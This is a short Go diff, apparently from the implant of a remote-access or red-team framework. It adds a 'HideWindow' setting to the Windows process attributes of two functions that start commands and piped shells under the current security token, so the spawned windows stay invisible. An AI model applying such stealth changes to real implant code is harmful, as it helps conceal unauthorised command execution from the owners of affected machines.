@@ -59,6 +59,7 @@ func Start(command string) error {
 	//{{if eq .GOOS "windows"}}
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		Token: syscall.Token(priv.CurrentToken),
+		HideWindow: true,
 	}
 	//{{end}}
 	return cmd.Start()
@@ -86,6 +87,7 @@ func pipedShell(tunnelID uint64, command []string) *Shell {
 	//{{if eq .GOOS "windows"}}
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		Token: syscall.Token(priv.CurrentToken),
+		HideWindow: true,
 	}
 	//{{end}}
 
